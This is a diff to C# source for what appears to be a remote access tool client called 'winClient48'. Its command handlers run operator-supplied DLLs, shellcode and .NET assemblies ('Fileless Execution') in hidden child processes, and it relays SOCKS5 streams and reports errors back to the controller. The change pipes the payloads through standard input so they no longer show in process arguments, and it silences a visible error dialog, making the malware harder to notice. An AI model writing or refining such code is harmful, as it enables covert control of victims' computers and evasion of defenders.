@@ -2520,13 +2520,18 @@ namespace winClient48
                                 var psi = new ProcessStartInfo
                                 {
                                     FileName = Process.GetCurrentProcess().MainModule.FileName,
-                                    Arguments = $"--dll {cmd[5]}",
+                                    Arguments = $"--dll",
                                     UseShellExecute = false,
+                                    RedirectStandardInput = true,
+                                    RedirectStandardError = true,
                                     RedirectStandardOutput = true,
                                     CreateNoWindow = true,
                                 };
 
-                                Process.Start(psi);
+                                var p = Process.Start(psi);
+                                p.StandardInput.Write(cmd[5]);
+                                p.StandardInput.Close();
+
                                 ret.szMsg = "Subprocess is started, please check.";
                                 break;
                             case 0:
@@ -2569,13 +2574,18 @@ namespace winClient48
                                 var psi = new ProcessStartInfo
                                 {
                                     FileName = Process.GetCurrentProcess().MainModule.FileName,
-                                    Arguments = $"--sc {cmd[4]}",
+                                    Arguments = $"--sc",
                                     UseShellExecute = false,
+                                    RedirectStandardError = true,
+                                    RedirectStandardInput = true,
                                     RedirectStandardOutput = true,
                                     CreateNoWindow = true,
                                 };
 
-                                Process.Start(psi);
+                                var p = Process.Start(psi);
+                                p.StandardInput.Write(cmd[4]);
+                                p.StandardInput.Close();
+
                                 ret.szMsg = "Subprocess is started, please check.";
                                 break;
                             case 0:
@@ -2728,10 +2738,6 @@ namespace winClient48
 
                 else if (cmd[0] == "fle") //Fileless Execution
                 {
-                    string[] alpArgs = cmd[2].Split(',').Select(x => clsCrypto.b64D2Str(x)).ToArray();
-                    byte[] abAssembly = Convert.FromBase64String(cmd[3]);
-                    clsfnLoader loader = new clsfnLoader();
-
                     (int nCode, string szMsg) ret = (0, string.Empty);
 
                     if (cmd[1] == "x64")
@@ -2739,36 +2745,44 @@ namespace winClient48
                         var psi = new ProcessStartInfo
                         {
                             FileName = Process.GetCurrentProcess().MainModule.FileName,
-                            Arguments = $"--x64 {cmd[3]}",
+                            Arguments = $"--x64",
                             UseShellExecute = false,
+                            RedirectStandardInput = true,
                             RedirectStandardOutput = true,
+                            RedirectStandardError = true,
                             CreateNoWindow = true,
                         };
+
+                        var p = Process.Start(psi);
+                        p.StandardInput.Write(cmd[3]);
+                        p.StandardInput.Close();
 
                         ret.nCode = 1;
                         ret.szMsg = "Subprocess is started, please check.";
                     }
                     else if (cmd[1] == "cs")
                     {
+                        string[] alpArgs = cmd[2].Split(',').Select(x => clsCrypto.b64D2Str(x)).ToArray();
+
                         var psi = new ProcessStartInfo
                         {
                             FileName = Process.GetCurrentProcess().MainModule.FileName,
-                            Arguments = $"--cs {cmd[3]} {string.Join(" ", alpArgs)}",
+                            Arguments = $"--cs",
                             UseShellExecute = false,
+                            RedirectStandardInput = true,
                             RedirectStandardOutput = true,
+                            RedirectStandardError = true,
                             CreateNoWindow = true,
                         };
+
+                        var p = Process.Start(psi);
+                        p.StandardInput.Write($"{cmd[3]}");
+                        p.StandardInput.Write(string.Join(" ", alpArgs));
+                        p.StandardInput.Close();
 
                         ret.nCode = 1;
                         ret.szMsg = "Subprocess is started, please check.";
                     }
-
-                    v.fnSendCommand(new string[]
-                    {
-                        "fle",
-                        ret.nCode.ToString(),
-                        ret.szMsg,
-                    });
                 }
 
                 #endregion
@@ -2883,6 +2897,8 @@ namespace winClient48
                                 m_dicSocks5.Remove(nStreamId);
                                 socks5.Dispose();
                             }
+
+
                         }
                     }
                 }
@@ -2891,7 +2907,7 @@ namespace winClient48
             }
             catch (Exception ex)
             {
-                MessageBox.Show(ex.Message, "winClient48");
+                //MessageBox.Show(ex.Message, "winClient48");
                 v.SendCommand($"error|{clsCrypto.b64E2Str(ex.Message)}");
             }
         }
